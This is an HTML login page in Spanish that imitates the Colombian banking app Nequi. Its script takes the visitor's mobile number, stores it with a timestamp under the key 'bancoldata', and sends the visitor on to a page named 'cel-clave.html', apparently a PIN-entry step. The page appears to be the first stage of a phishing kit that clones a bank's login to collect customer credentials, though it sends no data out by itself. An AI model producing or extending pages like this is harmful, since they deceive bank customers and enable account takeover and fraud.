<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Ingreso</title>

<link href="https://fonts.googleapis.com/css2?family=Inter:wght@500;600;700&display=swap" rel="stylesheet">

<style>
body {
  margin: 0;
  font-family: 'Inter', Arial, sans-serif;
  background: radial-gradient(circle at top, #3a003a, #200020);
  display: flex;
  justify-content: center;
  height: 100vh;
  overflow: hidden;
  color: white;
}

/* CONTENEDOR */
.container {
  width: 100%;
  max-width: 400px;
  height: 100vh;
  display: flex;
  flex-direction: column;
  padding: 20px;
  box-sizing: border-box;
}

/* HEADER */
header {
  display: flex;
  justify-content: space-between;
  align-items: center;
}

.help-icon {
  width: 20px;
  height: 20px;
  border: 2px solid white;
  border-radius: 50%;
  display: flex;
  justify-content: center;
  align-items: center;
  font-size: 14px;
}

/* LOGO */
.logo {
  margin-top: auto;
  text-align: center;
  font-size: 48px;
  font-weight: 700;
  display: flex;
  justify-content: center;
  align-items: center;
  gap: 8px;
}

.logo span {
  width: 12px;
  height: 12px;
  background: #ff008c;
  border-radius: 2px;
  display: inline-block;
}

/* FORM */
.form {
  margin-top: auto;
}

/* INPUT */
.input-box {
  background: rgba(255,255,255,0.15);
  border-radius: 10px;
  padding: 12px;
  display: flex;
  align-items: center;
  gap: 10px;
  border: 1px solid rgba(255,255,255,0.1);
  transition: 0.3s;
}

.input-box:focus-within {
  border-color: #ff008c;
  box-shadow: 0 0 0 2px rgba(255,0,140,0.2);
}

.prefix {
  border-right: 2px solid rgba(255,255,255,0.3);
  padding-right: 10px;
  font-weight: 600;
  color: #ff66c4;
}

.input-box input {
  flex: 1;
  border: none;
  outline: none;
  background: transparent;
  color: white;
  font-size: 16px;
}

.input-box input::placeholder {
  color: #bbb;
}

/* BOTÓN */
.btn {
  margin-top: 18px;
  width: 100%;
  padding: 14px;
  border: none;
  border-radius: 10px;
  background: #ff008c;
  color: white;
  font-size: 16px;
  font-weight: 600;
  cursor: pointer;
  opacity: 0.6; /* visible siempre */
  transition: 0.25s;
}

.btn.active {
  opacity: 1;
  box-shadow: 0 10px 25px rgba(255,0,140,0.3);
}

.btn:active {
  transform: scale(0.96);
}
</style>
</head>

<body>

<div class="container">

  <!-- HEADER (recuperado) -->
  <header>
    <div class="help-icon">?</div>

    <div>
      <svg width="70px" height="24px" viewBox="0 0 118 40">
        <text x="0" y="25" fill="white" font-size="20">Nequi</text>
      </svg>
    </div>
  </header>

  <!-- LOGO -->
  <div class="logo">
    <span></span>Nequi
  </div>

  <!-- FORM -->
  <div class="form">
    <div class="input-box">
      <div class="prefix">+57</div>
      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("phoneInput");
const btn = document.getElementById("btn");

// Formato 3-3-4
function formatNumber(value) {
  let digits = value.replace(/\D/g, "");

  if (digits.length > 10) digits = digits.slice(0, 10);

  if (digits.length > 6) {
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

// input
input.addEventListener("input", () => {
  input.value = formatNumber(input.value);

  const digits = input.value.replace(/\D/g, "");

  if (digits.length === 10 && digits.startsWith("3")) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

// click
btn.addEventListener("click", () => {
  const raw = input.value.replace(/\D/g, "");

  if (raw.length !== 10 || !raw.startsWith("3")) {
    alert("Número inválido");
    return;
  }

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.numero = raw;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  window.location.href = "cel-clave.html";
});
</script>

</body>
</html>
